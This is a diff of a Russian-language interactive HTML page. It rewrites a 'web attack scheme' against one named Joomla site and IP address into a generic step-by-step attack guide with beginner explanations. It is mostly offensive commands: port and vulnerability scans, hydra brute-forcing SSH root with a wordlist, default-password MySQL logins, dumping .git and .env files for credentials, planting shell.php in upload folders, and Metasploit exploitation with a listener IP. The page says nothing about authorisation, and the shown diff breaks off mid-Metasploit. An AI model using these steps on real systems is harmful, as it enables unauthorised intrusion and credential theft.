@@ -2,313 +2,476 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Схема веб-атаки · siteexample</title>
+<title>Схема веб-теста · с объяснениями</title>
 <style>
   :root {
-    --bg: #0f0f10;
-    --panel: #1a1a1d;
-    --panel2: #222226;
-    --border: #2e2e33;
-    --text: #ececec;
-    --dim: #8e8e96;
-    --accent: #10a37f;
-    --accent-soft: #0d2b24;
-    --red: #ef4444;
-    --orange: #f0a34a;
-    --purple: #a78bfa;
-    --notes-w: 340px;
+    --bg:#0f0f10; --panel:#1a1a1d; --panel2:#222226; --border:#2e2e33;
+    --text:#ececec; --dim:#8e8e96; --accent:#10a37f; --accent-soft:#0d2b24;
+    --red:#ef4444; --orange:#f0a34a; --purple:#a78bfa; --blue:#6aa8ff;
+    --notes-w:340px;
   }
-  * { box-sizing: border-box; }
+  * { box-sizing:border-box; }
   body {
-    font-family: 'Söhne', 'Segoe UI', system-ui, monospace;
-    background: var(--bg); color: var(--text);
-    margin: 0; padding: 24px calc(var(--notes-w) + 40px) 60px 16px;
-    transition: padding-right .25s ease;
+    font-family:'Söhne','Segoe UI',system-ui,sans-serif;
+    background:var(--bg); color:var(--text); margin:0; line-height:1.6;
+    padding:24px calc(var(--notes-w) + 40px) 60px 16px;
+    transition:padding-right .25s ease;
   }
-  body.notes-hidden { padding-right: 16px; }
+  body.notes-hidden { padding-right:16px; }
 
-  h1 { color: var(--text); text-align: center; font-weight: 600; font-size: 22px; }
-  h1 span { color: var(--accent); }
-  .sub { text-align: center; color: var(--dim); font-size: 13px; margin-bottom: 30px; }
+  h1 { text-align:center; font-weight:600; font-size:22px; margin:0 0 4px; }
+  h1 span { color:var(--accent); }
+  .sub { text-align:center; color:var(--dim); font-size:13px; margin-bottom:22px; }
+
+  /* ══ Поле цели ══ */
+  #targetBar {
+    max-width:900px; margin:0 auto 26px; background:var(--panel);
+    border:1px solid var(--border); border-radius:14px; padding:14px 18px;
+    display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+  }
+  #targetBar label { color:var(--dim); font-size:13px; }
+  #targetInput {
+    flex:1; min-width:220px; background:var(--bg); color:var(--accent);
+    border:1px solid var(--border); border-radius:10px; padding:9px 14px;
+    font-family:'JetBrains Mono',Consolas,monospace; font-size:13.5px; outline:none;
+  }
+  #targetInput:focus { border-color:var(--accent); }
 
   .step {
-    background: var(--panel); border: 1px solid var(--border);
-    border-radius: 16px; padding: 22px 24px;
-    margin: 0 auto 18px; max-width: 880px;
-    box-shadow: 0 1px 3px rgba(0,0,0,.4);
+    background:var(--panel); border:1px solid var(--border); border-radius:16px;
+    padding:22px 24px; margin:0 auto 18px; max-width:900px;
+    box-shadow:0 1px 3px rgba(0,0,0,.4);
   }
   .step h2 {
-    color: var(--text); font-size: 16px; font-weight: 600; margin: 0 0 14px;
-    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+    font-size:16px; font-weight:600; margin:0 0 6px;
+    display:flex; align-items:center; gap:10px; flex-wrap:wrap;
   }
   .badge {
-    background: var(--accent-soft); color: var(--accent);
-    border: 1px solid var(--accent); border-radius: 20px;
-    padding: 2px 10px; font-size: 11px; font-weight: 600;
+    background:var(--accent-soft); color:var(--accent);
+    border:1px solid var(--accent); border-radius:20px;
+    padding:2px 10px; font-size:11px; font-weight:600; white-space:nowrap;
   }
-  .done {
-    background: var(--accent-soft); color: var(--accent);
-    border-radius: 6px; padding: 10px 14px; font-size: 13.5px; margin: 10px 0;
-    border-left: 3px solid var(--accent);
+  /* короткое «зачем» под заголовком */
+  .why { color:var(--dim); font-size:13.5px; margin:0 0 12px; }
+
+  code { background:var(--panel2); color:#6ee7b7; padding:2px 7px; border-radius:6px;
+         font-family:'JetBrains Mono',Consolas,monospace; font-size:13px; }
+  pre { background:var(--panel2); color:#d8f5e9; padding:14px 16px; border-radius:10px;
+        border:1px solid var(--border); font-family:'JetBrains Mono',Consolas,monospace;
+        font-size:13px; line-height:1.65; overflow-x:auto; white-space:pre-wrap; }
+
+  /* ══ Объяснение ══ */
+  .explain {
+    background:var(--panel2); border-left:3px solid var(--blue);
+    border-radius:8px; margin:12px 0; padding:0;
   }
-  code {
-    background: var(--panel2); color: #6ee7b7; padding: 2px 7px;
-    border-radius: 6px; font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
+  .explain > summary {
+    cursor:pointer; padding:11px 15px; font-size:13.5px; color:var(--blue);
+    font-weight:600; list-style:none; user-select:none;
   }
-  pre {
-    background: var(--panel2); color: #d8f5e9; padding: 14px 16px;
-    border-radius: 10px; border: 1px solid var(--border);
-    font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
-    line-height: 1.6; overflow-x: auto; white-space: pre-wrap;
-  }
-  .branch {
-    color: var(--dim); font-size: 12.5px; margin: 14px 0 6px;
-    text-transform: uppercase; letter-spacing: 1px;
-  }
+  .explain > summary::-webkit-details-marker { display:none; }
+  .explain > summary::before { content:'▸ '; }
+  .explain[open] > summary::before { content:'▾ '; }
+  .explain > summary:hover { color:#9cc4ff; }
+  .explain .body { padding:0 16px 14px; font-size:13.8px; color:#c8ccd4; }
+  .explain .body p { margin:8px 0; }
+  .explain .body ul { margin:8px 0 8px 4px; padding-left:18px; }
+  .explain .body li { margin:5px 0; }
+  .explain .body b { color:var(--text); }
+  .explain .body .k { color:var(--purple); font-family:'JetBrains Mono',monospace; font-size:12.8px; }
+  .explain .body .v { color:var(--orange); }
+
+  .branch { color:var(--dim); font-size:12.5px; margin:16px 0 6px;
+            text-transform:uppercase; letter-spacing:1px; }
   button {
-    background: var(--panel2); color: var(--text);
-    border: 1px solid var(--border); padding: 8px 16px;
-    margin: 5px 6px 5px 0; border-radius: 10px; cursor: pointer;
-    font-size: 13.5px; transition: all .15s;
+    background:var(--panel2); color:var(--text); border:1px solid var(--border);
+    padding:8px 16px; margin:5px 6px 5px 0; border-radius:10px; cursor:pointer;
+    font-size:13.5px; transition:all .15s;
   }
-  button:hover { border-color: var(--accent); color: var(--accent); }
-  button.red:hover { border-color: var(--red); color: var(--red); }
-  .next {
-    display: none; margin-top: 12px; padding: 14px 16px;
-    background: var(--panel2); border: 1px solid var(--accent);
-    border-radius: 10px; font-size: 14px; line-height: 1.7;
-    animation: fade .25s ease;
-  }
-  @keyframes fade { from { opacity:0; transform: translateY(4px); } to { opacity:1; } }
-  .msf { border-color: var(--red); background: #1f1416; }
-  .msf h3 { color: var(--red); font-size: 14px; margin: 0 0 10px; }
-  .flag { color: var(--purple); }
-  .vuln { color: var(--orange); font-weight: 600; }
-  .arrow { text-align: center; color: var(--dim); font-size: 18px; margin: 4px 0 14px; }
-  table { width: 100%; border-collapse: collapse; font-size: 13.5px; margin: 10px 0; }
-  td, th { border: 1px solid var(--border); padding: 8px 12px; text-align: left; }
-  th { background: var(--panel2); color: var(--accent); font-weight: 600; }
-  td b { color: var(--accent); }
-  .go { background: var(--accent); color: #fff; border: none; font-weight: 600; }
-  .go:hover { background: #0d8a6c; color: #fff; }
+  button:hover { border-color:var(--accent); color:var(--accent); }
+  button.red:hover { border-color:var(--red); color:var(--red); }
+  .next { display:none; margin-top:12px; padding:14px 16px; background:var(--panel2);
+          border:1px solid var(--accent); border-radius:10px; font-size:14px;
+          line-height:1.7; animation:fade .25s ease; }
+  @keyframes fade { from{opacity:0;transform:translateY(4px);} to{opacity:1;} }
+  .msf { border-color:var(--red); background:#1f1416; }
+  .msf h3 { color:var(--red); font-size:14px; margin:0 0 10px; }
+  .flag { color:var(--purple); }
+  .vuln { color:var(--orange); font-weight:600; }
+  .arrow { text-align:center; color:var(--dim); font-size:18px; margin:4px 0 14px; }
+  table { width:100%; border-collapse:collapse; font-size:13.5px; margin:10px 0; }
+  td,th { border:1px solid var(--border); padding:8px 12px; text-align:left; }
+  th { background:var(--panel2); color:var(--accent); font-weight:600; }
+  td b { color:var(--accent); }
+  .go { background:var(--accent); color:#fff; border:none; font-weight:600; }
+  .go:hover { background:#0d8a6c; color:#fff; }
 
-  /* ══════ ПАНЕЛЬ ЗАМЕТОК ══════ */
+  /* ══ Заметки ══ */
   #notes {
-    position: fixed; top: 0; right: 0; width: var(--notes-w); height: 100vh;
-    background: var(--panel); border-left: 1px solid var(--border);
-    display: flex; flex-direction: column; z-index: 100;
-    transition: transform .25s ease;
+    position:fixed; top:0; right:0; width:var(--notes-w); height:100vh;
+    background:var(--panel); border-left:1px solid var(--border);
+    display:flex; flex-direction:column; z-index:100; transition:transform .25s ease;
   }
-  #notes.hidden { transform: translateX(100%); }
-  #notes header {
-    padding: 16px 18px 12px; border-bottom: 1px solid var(--border);
-    display: flex; align-items: center; justify-content: space-between;
-  }
-  #notes header h2 {
-    margin: 0; font-size: 14px; font-weight: 600; color: var(--text);
-    display: flex; align-items: center; gap: 8px;
-  }
-  #notes header h2::before { content: '📝'; }
+  #notes.hidden { transform:translateX(100%); }
+  #notes header { padding:16px 18px 12px; border-bottom:1px solid var(--border);
+                  display:flex; align-items:center; justify-content:space-between; }
+  #notes header h2 { margin:0; font-size:14px; font-weight:600;
+                     display:flex; align-items:center; gap:8px; }
+  #notes header h2::before { content:'📝'; }
   #notes textarea {
-    flex: 1; width: 100%; resize: none; border: none; outline: none;
-    background: var(--bg); color: var(--text);
-    font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
-    line-height: 1.75; padding: 16px 18px;
-    border-bottom: 1px solid var(--border);
+    flex:1; width:100%; resize:none; border:none; outline:none;
+    background:var(--bg); color:var(--text);
+    font-family:'JetBrains Mono',Consolas,monospace; font-size:13px;
+    line-height:1.75; padding:16px 18px; border-bottom:1px solid var(--border);
   }
-  #notes textarea::placeholder { color: #5a5a62; }
-  #notes footer {
-    padding: 12px 14px; display: flex; flex-wrap: wrap; gap: 8px;
-    border-top: 1px solid var(--border); align-items: center;
-  }
-  #notes footer button { margin: 0; padding: 7px 12px; font-size: 12.5px; }
-  #savedHint {
-    font-size: 11.5px; color: var(--accent); margin-left: auto;
-    opacity: 0; transition: opacity .25s;
-  }
-  #savedHint.show { opacity: 1; }
+  #notes textarea::placeholder { color:#5a5a62; }
+  #notes footer { padding:12px 14px; display:flex; flex-wrap:wrap; gap:8px;
+                  border-top:1px solid var(--border); align-items:center; }
+  #notes footer button { margin:0; padding:7px 12px; font-size:12.5px; }
+  #savedHint { font-size:11.5px; color:var(--accent); margin-left:auto;
+               opacity:0; transition:opacity .25s; }
+  #savedHint.show { opacity:1; }
   #notesToggle {
-    position: fixed; top: 16px; right: calc(var(--notes-w) + 16px);
-    z-index: 101; background: var(--panel); border: 1px solid var(--border);
-    color: var(--accent); border-radius: 10px; padding: 8px 14px;
-    font-size: 13px; cursor: pointer; transition: right .25s ease, background .15s;
+    position:fixed; top:16px; right:calc(var(--notes-w) + 16px); z-index:101;
+    background:var(--panel); border:1px solid var(--border); color:var(--accent);
+    border-radius:10px; padding:8px 14px; font-size:13px; cursor:pointer;
+    transition:right .25s ease, background .15s;
   }
-  #notesToggle:hover { background: var(--panel2); }
-  #notesToggle.hidden { right: 16px; }
+  #notesToggle:hover { background:var(--panel2); }
+  #notesToggle.hidden { right:16px; }
 
-  @media (max-width: 760px) {
-    body { padding-right: 16px; }
-    #notes { width: 100%; height: 55vh; top: auto; bottom: 0; border-left: none;
-             border-top: 1px solid var(--border); border-radius: 16px 16px 0 0; }
-    #notes.hidden { transform: translateY(100%); }
-    #notesToggle { right: 16px; bottom: 16px; top: auto; }
+  @media (max-width:760px) {
+    body { padding-right:16px; }
+    #notes { width:100%; height:55vh; top:auto; bottom:0; border-left:none;
+             border-top:1px solid var(--border); border-radius:16px 16px 0 0; }
+    #notes.hidden { transform:translateY(100%); }
+    #notesToggle { right:16px; bottom:16px; top:auto; }
   }
 </style>
 </head>
 <body>
 
-<h1>🎯 <span>СХЕМА ВЕБ-АТАКИ</span> · siteexample</h1>
-<div class="sub">Joomla · Apache 2.4.69 · Debian · 185.224.89.46</div>
+<h1>🎯 <span>СХЕМА ВЕБ-ТЕСТА</span></h1>
+<div class="sub">Любой сайт · шаги с объяснениями · заметки справа</div>
+
+<div id="targetBar">
+  <label for="targetInput">Цель:</label>
+  <input id="targetInput" type="text" value="example.com"
+         placeholder="example.com или https://example.com" spellcheck="false">
+  <button onclick="applyTarget()">Применить</button>
+</div>
 
 <!-- ═══ ШАГ 1 ═══ -->
 <div class="step">
 <h2><span class="badge">Шаг 1</span> Сайт живой?</h2>
-<pre>curl -I https://www.siteexample.com</pre>
-<div class="done">✅ Результат: [200 OK] → сайт живой</div>
-<button class="go" onclick="go('step2')">Шаг 2 →</button>
+<p class="why">Проверяем, что сайт вообще открывается снаружи. Если нет — остальное бессмысленно.</p>
+<pre>curl -I https://TARGET</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>curl</b> — программа, которая «дёргает» страницу и показывает, что ответил сервер.
+<span class="k">-I</span> — попросить только служебные заголовки, без самой страницы: быстро и не грузит сайт.</p>
+<p><b>Что смотреть</b> — первую строку ответа:</p>
+<ul>
+<li><span class="v">200 OK</span> — страница есть, всё нормально</li>
+<li><span class="v">301 / 302</span> — страница переехала на другой адрес, тоже нормально</li>
+<li><span class="v">403</span> — сервер говорит «не пущу», но он живой</li>
+<li><span class="v">000</span> — ответа не было: нет такого домена или сервер лежит</li>
+</ul>
+</div>
+</details>
+
+<div class="branch">Развилки:</div>
+<button onclick="show('n1a')">200 / 301 / 302</button>
+<div class="next" id="n1a">→ сайт живой → Шаг 2</div>
+<button onclick="show('n1b')">403</button>
+<div class="next" id="n1b">→ доступ «мягко» закрыт, но сервер жив → всё равно Шаг 2</div>
+<button onclick="show('n1c')">000 / Could not resolve</button>
+<div class="next" id="n1c">→ СТОП. Домен не существует или опечатка в адресе.</div>
+<br><button class="go" onclick="go('step2')">Шаг 2 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 2 ═══ -->
 <div class="step" id="step2">
-<h2><span class="badge">Шаг 2</span> Порты (nmap)</h2>
-<pre>nmap -sV -sC -T4 --top-ports 1000 www.siteexample.com</pre>
-<p><span class="flag">-sV</span>=версии · <span class="flag">-sC</span>=скрипты · <span class="flag">-T4</span>=скорость (0–5)</p>
-<div class="branch">Развилки:</div>
-<button onclick="show('n2a')">Только 80/443</button>
-<div class="next" id="n2a">→ Шаг 3. Твой случай: Apache 2.4.69 на 443.</div>
-<button onclick="show('n2b')">22 SSH открыт</button>
-<div class="next" id="n2b">→ <code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://www.siteexample.com</code></div>
-<button onclick="show('n2c')">21 FTP / 3306 MySQL</button>
-<div class="next" id="n2c">→ FTP: <code>ftp www.siteexample.com</code> (anonymous) · MySQL: <code>mysql -h 185.224.89.46 -u root -p</code></div>
+<h2><span class="badge">Шаг 2</span> Какие порты открыты</h2>
+<p class="why">Порты — это «двери» сервера. Веб обычно на 80/443, но рядом часто открыто что-то попроще.</p>
+<pre>nmap -sV -sC -T4 --top-ports 1000 TARGET</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>nmap</b> — сканер: стучится в порты и сообщает, какие открыты и что за ними стоит.</p>
+<ul>
+<li><span class="k">--top-ports 1000</span> — проверить 1000 самых популярных портов (быстро); <span class="k">-p-</span> — все 65535 (долго)</li>
+<li><span class="k">-sV</span> (Version) — не просто «дверь открыта», а какая программа и какой версии</li>
+<li><span class="k">-sC</span> — запустить готовые проверочные скрипты</li>
+<li><span class="k">-T</span> (Timing) — скорость: <b>0</b>=очень тихо, <b>2</b>=вежливо, <b>4</b>=быстро, <b>5</b>=максимально быстро (и заметно)</li>
+</ul>
+<p><b>Что смотреть:</b> строки со словом <span class="v">open</span> — это открытые двери.</p>
+</div>
+</details>
+
+<div class="branch">Развилки по выводу:</div>
+<button onclick="show('n2a')">80 / 443 (веб)</button>
+<div class="next" id="n2a">→ Шаг 3 (обычный веб-путь)</div>
+<button onclick="show('n2b')">22 (SSH)</button>
+<div class="next" id="n2b">→ ветка SSH: <code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://TARGET</code></div>
+<button onclick="show('n2c')">21 (FTP)</button>
+<div class="next" id="n2c">→ <code>ftp TARGET</code>, логин <code>anonymous</code>, пароль пустой</div>
+<button onclick="show('n2d')">3306 (MySQL)</button>
+<div class="next" id="n2d">→ <code>mysql -h TARGET -u root -p</code> (пробуй пустой пароль, root, toor)</div>
+<button onclick="show('n2e')">8080 / 8000 / 8443 / 9000</button>
+<div class="next" id="n2e">→ открой <code>http://TARGET:8080</code> в браузере — часто там панель управления</div>
+<button onclick="show('n2f')">Пусто (все closed/filtered)</button>
+<div class="next" id="n2f">→ СТОП. Сайт за фильтром или на другом IP.</div>
 <br><button class="go" onclick="go('step3')">Шаг 3 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 3 ═══ -->
 <div class="step" id="step3">
-<h2><span class="badge">Шаг 3</span> WAF?</h2>
-<pre>wafw00f -a https://www.siteexample.com</pre>
+<h2><span class="badge">Шаг 3</span> Есть защита WAF?</h2>
+<p class="why">WAF — «охранник», который распознаёт атаки и банит. От его наличия зависит, насколько громко можно сканировать.</p>
+<pre>wafw00f -a https://TARGET</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>wafw00f</b> — определяет WAF по тому, как сервер отвечает.
+<span class="k">-a</span> (all) — проверить все известные подписи охранников, а не только первые.</p>
+<p><b>Что смотреть:</b> <span class="v">is behind Cloudflare/Akamai…</span> = охрана есть;
+<span class="v">No WAF detected</span> = охраны нет.</p>
+<p><b>Это не отдельный путь, а режим:</b></p>
+<ul>
+<li>WAF есть → тихо: <span class="k">-T2</span>, <span class="k">-t 10</span>, <span class="k">-c 25</span>, sqlmap <span class="k">--level 2 --risk 1</span></li>
+<li>WAF нет → можно громче: <span class="k">-T4</span>, <span class="k">-t 50</span>, <span class="k">-c 100</span></li>
+</ul>
+</div>
+</details>
+
 <div class="branch">Развилки:</div>
 <button onclick="show('n3a')">is behind … (WAF есть)</button>
-<div class="next" id="n3a">→ тихий режим: <span class="flag">-T2</span>, <span class="flag">-t 10</span>, <span class="flag">-c 25</span>, sqlmap <span class="flag">--level 2 --risk 1</span></div>
+<div class="next" id="n3a">→ тихий режим: <span class="flag">-T2</span>, <span class="flag">-t 10</span>, <span class="flag">-c 25</span>, <span class="flag">-rl 50</span>, sqlmap <span class="flag">--level 2 --risk 1</span></div>
 <button onclick="show('n3b')">No WAF detected</button>
-<div class="next" id="n3b">→ громкий режим: <span class="flag">-T4</span>, <span class="flag">-t 50</span>, <span class="flag">-c 100</span></div>
+<div class="next" id="n3b">→ громкий режим: <span class="flag">-T4</span>, <span class="flag">-t 50</span>, <span class="flag">-c 100</span>, <span class="flag">-rl 150</span></div>
 <br><button class="go" onclick="go('step4')">Шаг 4 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 4 ═══ -->
 <div class="step" id="step4">
-<h2><span class="badge">Шаг 4</span> Что за сайт? <span class="badge">✅ выполнен</span></h2>
-<pre>whatweb -a 3 https://www.siteexample.com</pre>
-<div class="done">✅ Результат: <b>JOOMLA</b> · Apache 2.4.69 · Debian · IP 185.224.89.46</div>
-<pre>joomscan -u https://www.siteexample.com
-searchsploit apache 2.4
-nuclei -u http://185.224.89.46 -severity low,medium,high,critical</pre>
-<button class="go" onclick="go('step5')">Шаг 5 →</button>
+<h2><span class="badge">Шаг 4</span> Что за сайт внутри</h2>
+<p class="why">Сайты собраны на «движках» (CMS). У каждого свои дыры и свой инструмент проверки.</p>
+<pre>whatweb -a 3 https://TARGET</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>whatweb</b> — «опознаватель» технологий: смотрит заголовки, cookie, HTML-теги и говорит, на чём сделан сайт.</p>
+<p><span class="k">-a</span> (aggressiveness) — агрессивность:
+<span class="v">1</span> = один тихий запрос,
+<span class="v">2</span> = чуть больше,
+<span class="v">3</span> = агрессивно, точнее всего (но заметно в логах),
+<span class="v">4</span> = heavy, может задеть сайт.</p>
+<p><b>Что смотреть:</b> название движка, версии, IP-адрес сервера.</p>
+</div>
+</details>
+
+<div class="branch">Развилки по выводу:</div>
+<button onclick="show('n4a')">WordPress</button>
+<div class="next" id="n4a">
+<pre>wpscan --url https://TARGET --enumerate ap,at,u --api-token <ТОКЕН>
+# ap = все плагины, at = все темы, u = пользователи</pre>
+→ нашёл <code>[!] Title: … [CVE-…]</code> → <code>searchsploit &lt;имя_плагина&gt;</code> → Шаг 8а
+</div>
+<button onclick="show('n4b')">Joomla</button>
+<div class="next" id="n4b">
+<pre>joomscan -u https://TARGET
+searchsploit joomla</pre>
+→ нашёл админку <code>/administrator/</code> → Шаг 9 · нашёл CVE → Шаг 8а
+</div>
+<button onclick="show('n4c')">Drupal</button>
+<div class="next" id="n4c">
+<pre>droopescan scan drupal -u https://TARGET
+searchsploit drupal</pre>
+</div>
+<button onclick="show('n4d')">Ничего не опознано / SPA</button>
+<div class="next" id="n4d">→ CMS не определена. У React/Vue-сайтов папок почти нет → Шаг 5, затем сразу Шаг 10 (Burp).</div>
+<button onclick="show('n4e')">Известна версия сервера</button>
+<div class="next" id="n4e">→ <code>searchsploit &lt;сервер&gt; &lt;версия&gt;</code> + в Шаге 7б добавь тег технологии</div>
+<br><button class="go" onclick="go('step5')">Шаг 5 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 5 ═══ -->
 <div class="step" id="step5">
-<h2><span class="badge">Шаг 5</span> nikto <span class="badge">✅ выполнен</span></h2>
-<pre>nikto -h https://www.siteexample.com -Tuning 12389</pre>
-<table>
-<tr><th>Находка</th><th>Значит</th><th>Куда</th></tr>
-<tr><td><b>/administratie/</b></td><td>открытая админ-страница</td><td>Шаг 9 (hydra)</td></tr>
-<tr><td><b>/administrator/index.php</b></td><td>админка Joomla</td><td>Шаг 9 (hydra)</td></tr>
-<tr><td><b>/login/</b></td><td>вторая форма входа</td><td>Шаг 9</td></tr>
-<tr><td><b>/files/ /fotos/ /tmp/ /includes/</b></td><td>открытые каталоги</td><td>шелл после входа → /files/</td></tr>
-<tr><td><b>htaccess.txt</b></td><td>дефолтный конфиг Joomla не скрыт</td><td>открыть в браузере</td></tr>
-<tr><td>Cookie без secure flag</td><td>мелкая защита cookie</td><td>в отчёт</td></tr>
-<tr><td>нет CSP / HSTS / X-Content-Type-Options</td><td>заголовки отсутствуют</td><td>в отчёт (low severity)</td></tr>
-</table>
-<button class="go" onclick="go('step6')">Шаг 6 →</button>
+<h2><span class="badge">Шаг 5</span> Известные слабости (nikto)</h2>
+<p class="why">Автоматический «чек-лист» на тысячи мелких ошибок: забытые файлы, бэкапы, тестовые страницы.</p>
+<pre>nikto -h https://TARGET -Tuning 12389</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<p><b>nikto</b> делает много мелких проверок и выдаёт список подозрительного.</p>
+<p><span class="k">-Tuning</span> — какие категории включить:
+<span class="v">1</span> интересные файлы,
+<span class="v">2</span> ошибки настроек,
+<span class="v">3</span> утечка информации,
+<span class="v">4</span> инъекции,
+<span class="v">8</span> выполнение команд,
+<span class="v">9</span> SQL-инъекции.
+<span class="v">6</span> = DoS-тесты (нагрузка) — на живом сайте лучше не включать.</p>
+<p><b>Что смотреть:</b> строки, начинающиеся с <span class="k">+</span> — это находки.</p>
+</div>
+</details>
+
+<div class="branch">Развилки:</div>
+<button onclick="show('n5a')">+ /admin/ или /login found</button>
+<div class="next" id="n5a">→ открой в браузере, запомни путь → потом Шаг 9 (hydra)</div>
+<button onclick="show('n5b')">+ backup.zip / .bak / .old</button>
+<div class="next" id="n5b">→ скачай: <code>wget https://TARGET/backup.zip</code> — внутри бывают пароли и исходники</div>
+<button onclick="show('n5c')">+ htaccess.txt / LICENSE / README</button>
+<div class="next" id="n5c">→ открой в браузере: подсказывает CMS и версию</div>
+<button onclick="show('n5d')">+ phpinfo / upload / admin panel</button>
+<div class="next" id="n5d">→ <code>/phpinfo.php</code> показывает пути и версии; открытая загрузка = кандидат на шелл</div>
+<button onclick="show('n5e')">0 item(s) reported</button>
+<div class="next" id="n5e">→ чисто → Шаг 6</div>
+<br><button class="go" onclick="go('step6')">Шаг 6 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 6 ═══ -->
 <div class="step" id="step6">
-<h2><span class="badge">Шаг 6</span> Скрытые папки (gobuster)</h2>
-<pre>gobuster dir -u https://www.siteexample.com \
+<h2><span class="badge">Шаг 6</span> Скрытые папки</h2>
+<p class="why">На сайте часто есть страницы без ссылок в меню: <code>/admin</code>, <code>/backup</code>, <code>/test</code>. Их находят перебором имён.</p>
+<pre>gobuster dir -u https://TARGET \
   -w /usr/share/wordlists/dirb/common.txt \
-  -x php,html,bak,zip -t 10</pre>
+  -x php,html,txt,bak,zip -t 10</pre>
+
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<ul>
+<li><span class="k">dir</span> — режим поиска каталогов</li>
+<li><span class="k">-w</span> — словарь: текстовый файл, где по одному имени в строке (admin, backup, test…)</li>
+<li><span class="k">-x</span> — дописывать расширения: <code>index</code> + <code>.php</code> = <code>index.php</code></li>
+<li><span class="k">-t</span> — сколько проверок одновременно: <b>10</b>=вежливо, <b>50</b>=быстро, <b>100</b>=сайт может «икнуть»</li>
+</ul>
+<p><b>Читаем только по коду ответа:</b></p>
+<ul>
+<li><span class="v">200</span> — страница есть, открывай</li>
+<li><span class="v">301 / 302</span> — есть (переехала)</li>
+<li><span class="v">403</span> — есть, но не пускает</li>
+<li><span class="v">404</span> — не существует</li>
+</ul>
+</div>
+</details>
+
 <div class="branch">Развилки:</div>
-<button onclick="show('n6a')">/administrator 200</button>
-<div class="next" id="n6a">→ запомнили, идём в Шаг 9 после nuclei</div>
-<button onclick="show('n6b')">/.git найден</button>
-<div class="next" id="n6b">→ <code>git-dumper https://www.siteexample.com/.git ./src</code></div>
-<button onclick="show('n6c')">Одни 404</button>
-<div class="next" id="n6c">→ Шаг 7</div>
+<button onclick="show('n6a')">/admin, /login, /panel</button>
+<div class="next" id="n6a">→ Шаг 9 (hydra)</div>
+<button onclick="show('n6b')">/.git или /.env</button>
+<div class="next" id="n6b">
+<pre>git-dumper https://TARGET/.git ./src   # исходники
+curl https://TARGET/.env              # пароли БД</pre>
+</div>
+<button onclick="show('n6c')">/uploads, /files</button>
+<div class="next" id="n6c">→ после входа в панель пробуй залить туда <code>shell.php</code></div>
+<button onclick="show('n6d')">Только 404</button>
+<div class="next" id="n6d">→ Шаг 7</div>
 <br><button class="go" onclick="go('step7')">Шаг 7 →</button>
 </div>
 <div class="arrow">▼</div>
 
 <!-- ═══ ШАГ 7 ═══ -->
 <div class="step" id="step7">
-<h2><span class="badge">Шаг 7</span> nuclei + переход в Metasploit</h2>
+<h2><span class="badge">Шаг 7</span> Шаблоны уязвимостей (nuclei) → Metasploit</h2>
+<p class="why">База из тысяч готовых проверок конкретных CVE и ошибок настройки. Один запуск — тысячи проверок.</p>
 <pre># 7а — общий прогон
 nuclei -update-templates
-nuclei -u https://www.siteexample.com \
+nuclei -u https://TARGET \
   -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt
 
-# 7б — прицельный (Joomla + Apache):
-nuclei -u https://www.siteexample.com \
-  -tags joomla,cve,misconfig,apache \
-  -severity low,medium,high,critical
+# 7б — прицельный (тег технологии из Шага 4)
+nuclei -u https://TARGET \
+  -tags wordpress,joomla,drupal,apache,nginx,cve,misconfig \
+  -severity low,medium,high,critical</pre>
 
-# 7в — по прямому IP:
-nuclei -u http://185.224.89.46 -severity low,medium,high,critical</pre>
+<details class="explain">
+<summary>Что это значит (объяснение)</summary>
+<div class="body">
+<ul>
+<li><span class="k">-severity</span> — важность: <code>info</code> (просто инфо) → <code>low</code> → <code>medium</code> → <code>high</code> → <code>critical</code> (самое опасное)</li>
+<li><span class="k">-tags</span> — запускать только шаблоны с этими метками</li>
+<li><span class="k">-c</span> — сколько шаблонов параллельно (<b>25</b> тихо, <b>100</b> быстро)</li>
+<li><span class="k">-rl</span> — запросов в секунду</li>
+</ul>
+<p><b>Что смотреть:</b> строки с <span class="v">[critical]</span>, <span class="v">[high]</span>, <span class="v">[CVE-XXXX]</span>, <span class="v">[rce]</span>, <span class="v">[sqli]</span> — каждая такая строка = реальная найденная дыра и адрес, где она живёт.</p>
+</div>
+</details>
 
 <div class="branch">▼ Что нашёл nuclei → команда Metasploit</div>
 
-<button class="red" onclick="show('msf1')">[critical] [cve] Joomla RCE</button>
-<div class="next msf" id="msf1">
-<h3>Metasploit · <span class="vuln">[Joomla! Remote Code Execution — CVE-2023-23752 и др.]</span></h3>
+<button class="red" onclick="show('m1')">[critical] [cve] → RCE</button>
+<div class="next msf" id="m1">
+<h3>Metasploit · <span class="vuln">[имя уязвимости из nuclei]</span></h3>
 <pre>msfconsole -q
-msf6&gt; search joomla
-msf6&gt; use exploit/multi/http/joomla_*   ← по номеру из поиска
-msf6&gt; set RHOSTS 185.224.89.46
-msf6&gt; set RPORT 443
-msf6&gt; set SSL true
-msf6&gt; set LHOST &lt;твой_IP&gt;     ← ip a
+msf6&gt; search &lt;cve-номер или название из nuclei&gt;
+msf6&gt; use exploit/&lt;путь из поиска&gt;
+msf6&gt; set RHOSTS IP_ЦЕЛИ
+msf6&gt; set RPORT 443          ← 80 если http
+msf6&gt; set SSL true           ← true для https
+msf6&gt; set TARGETURI /
+msf6&gt; set LHOST &lt;твой_IP&gt;    ← ip a
